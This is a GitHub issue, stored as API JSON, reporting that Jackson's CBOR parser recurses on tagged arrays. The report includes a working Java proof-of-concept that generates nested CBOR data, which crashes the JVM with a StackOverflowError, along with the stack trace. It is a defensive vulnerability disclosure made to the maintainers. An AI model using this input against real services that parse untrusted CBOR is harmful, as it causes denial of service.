{"url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185","repository_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary","labels_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185/labels{/name}","comments_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185/comments","events_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185/events","html_url":"https://github.com/FasterXML/jackson-dataformats-binary/issues/185","id":506810359,"node_id":"MDU6SXNzdWU1MDY4MTAzNTk=","number":185,"title":"Internal parsing of tagged arrays can lead to stack overflow","user":{"login":"padolph","id":1431919,"node_id":"MDQ6VXNlcjE0MzE5MTk=","avatar_url":"https://avatars.githubusercontent.com/u/1431919?v=4","gravatar_id":"","url":"https://api.github.com/users/padolph","html_url":"https://github.com/padolph","followers_url":"https://api.github.com/users/padolph/followers","following_url":"https://api.github.com/users/padolph/following{/other_user}","gists_url":"https://api.github.com/users/padolph/gists{/gist_id}","starred_url":"https://api.github.com/users/padolph/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/padolph/subscriptions","organizations_url":"https://api.github.com/users/padolph/orgs","repos_url":"https://api.github.com/users/padolph/repos","events_url":"https://api.github.com/users/padolph/events{/privacy}","received_events_url":"https://api.github.com/users/padolph/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":433796776,"node_id":"MDU6TGFiZWw0MzM3OTY3NzY=","url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/labels/cbor","name":"cbor","color":"d4c5f9","default":false,"description":null}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":{"url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/milestones/29","html_url":"https://github.com/FasterXML/jackson-dataformats-binary/milestone/29","labels_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/milestones/29/labels","id":4806884,"node_id":"MDk6TWlsZXN0b25lNDgwNjg4NA==","number":29,"title":"2.10.1","description":null,"creator":{"login":"cowtowncoder","id":55065,"node_id":"MDQ6VXNlcjU1MDY1","avatar_url":"https://avatars.githubusercontent.com/u/55065?v=4","gravatar_id":"","url":"https://api.github.com/users/cowtowncoder","html_url":"https://github.com/cowtowncoder","followers_url":"https://api.github.com/users/cowtowncoder/followers","following_url":"https://api.github.com/users/cowtowncoder/following{/other_user}","gists_url":"https://api.github.com/users/cowtowncoder/gists{/gist_id}","starred_url":"https://api.github.com/users/cowtowncoder/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/cowtowncoder/subscriptions","organizations_url":"https://api.github.com/users/cowtowncoder/orgs","repos_url":"https://api.github.com/users/cowtowncoder/repos","events_url":"https://api.github.com/users/cowtowncoder/events{/privacy}","received_events_url":"https://api.github.com/users/cowtowncoder/received_events","type":"User","user_view_type":"public","site_admin":false},"open_issues":0,"closed_issues":2,"state":"open","created_at":"2019-11-01T22:41:52Z","updated_at":"2019-11-07T22:30:34Z","due_on":null,"closed_at":null},"comments":5,"created_at":"2019-10-14T18:33:13Z","updated_at":"2019-11-01T23:01:28Z","closed_at":"2019-11-01T23:01:27Z","author_association":"NONE","type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"It is very easy to craft CBOR tagged array data that causes a java.lang.StackOverflowError. Because the CBOR implementation of JsonParser.nextToken() recurses internally when it encounters tagged array data, there is very little the application programmer can do to protect against this exception. Suggest rethinking the recursive approach, or at least capping the max recursion depth.\r\n\r\nFor CBOR parsers that process untrusted data, this creates a serious DOS vulnerability. Most likely _any_ CBOR parser implemented using Jackson is vulnerable to this problem. \r\n\r\nHere is code that generates (nonsensical) CBOR data that crashes the JVM with a StackOverflowError. I am currently using jackson-dataformat-cbor-2.9.9\r\n\r\n```\r\nimport java.io.*;\r\n\r\nimport com.fasterxml.jackson.core.*;\r\nimport com.fasterxml.jackson.dataformat.cbor.CBORConstants;\r\nimport com.fasterxml.jackson.dataformat.cbor.CBORFactory;\r\nimport com.fasterxml.jackson.dataformat.cbor.CBORParser;\r\n\r\npublic class CBORRecurse {\r\n   public static void main(String[] args) {\r\n\t   for (int i = 100; i < 1024 * 1024; i = i * 10) {\r\n\t\t   _testRecurse(i);\r\n\t   }\r\n   }\r\n   private static void _testRecurse(int levels)\r\n   {\r\n\t   System.out.println(\"Trying \" + String.valueOf(levels));\r\n\t   byte[] data = new byte[levels * 2];\r\n\t   for (int i = 0; i < levels; i++) {\r\n\t\t   data[i * 2] = (byte)(CBORConstants.PREFIX_TYPE_TAG +\r\n\t\t\t\t   CBORConstants.TAG_DECIMAL_FRACTION);\r\n\t\t   data[(i * 2) + 1] = (byte)(CBORConstants.PREFIX_TYPE_ARRAY +\r\n\t\t\t\t   2);\r\n\t   }\r\n\r\n\t   CBORFactory f = new CBORFactory();\r\n\t   JsonParser p;\r\n\t   try {\r\n\t\t   p = f.createParser(data);\r\n\t   } catch (IOException e) {\r\n\t\t   System.err.println(\"Caught IOException while creating parser: \" + e.getMessage());\r\n\t\t   return;\r\n\t   }\r\n\t   try {\r\n\t\t   if (p.nextToken() == JsonToken.START_ARRAY) {\r\n\t\t\t   System.out.println(\"Saw array\");\r\n\t\t   } else {\r\n\t\t\t   System.out.println(\"Saw something else\");\r\n\t\t   }\r\n\t   } catch (JsonParseException e) {\r\n\t\t   System.err.println(\"Caught JsonParseException: \" + e.getMessage());\r\n\t   } catch (IOException e) {\r\n\t\t   System.err.println(\"Caught IOException: \" + e.getMessage());\r\n\t   } catch (OutOfMemoryError e) {\r\n\t\t   System.err.println(\"Caught OutOfMemoryError: \" + e.getMessage());\r\n\t   }\r\n\t   try {\r\n\t\t   p.close();\r\n\t   } catch (IOException e) {\r\n\t\t   // Do nothing.\r\n\t   }\r\n   }\r\n}\r\n```\r\n\r\nThis program will try many values of array recursion depth until the JVM crashes. On my laptop this happens around 'level' 10000.\r\n\r\n```\r\nTrying 10000\r\nException in thread \"main\" java.lang.StackOverflowError\r\n\tat com.fasterxml.jackson.dataformat.cbor.CBORParser._handleTaggedArray(CBORParser.java:859)\r\n\tat com.fasterxml.jackson.dataformat.cbor.CBORParser.nextToken(CBORParser.java:732)\r\n\tat com.fasterxml.jackson.dataformat.cbor.CBORParser._handleTaggedArray(CBORParser.java:872)\r\n\tat com.fasterxml.jackson.dataformat.cbor.CBORParser.nextToken(CBORParser.java:732)\r\n\t...\r\n```\r\n","closed_by":{"login":"cowtowncoder","id":55065,"node_id":"MDQ6VXNlcjU1MDY1","avatar_url":"https://avatars.githubusercontent.com/u/55065?v=4","gravatar_id":"","url":"https://api.github.com/users/cowtowncoder","html_url":"https://github.com/cowtowncoder","followers_url":"https://api.github.com/users/cowtowncoder/followers","following_url":"https://api.github.com/users/cowtowncoder/following{/other_user}","gists_url":"https://api.github.com/users/cowtowncoder/gists{/gist_id}","starred_url":"https://api.github.com/users/cowtowncoder/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/cowtowncoder/subscriptions","organizations_url":"https://api.github.com/users/cowtowncoder/orgs","repos_url":"https://api.github.com/users/cowtowncoder/repos","events_url":"https://api.github.com/users/cowtowncoder/events{/privacy}","received_events_url":"https://api.github.com/users/cowtowncoder/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/FasterXML/jackson-dataformats-binary/issues/185/timeline","performed_via_github_app":null,"state_reason":"completed"}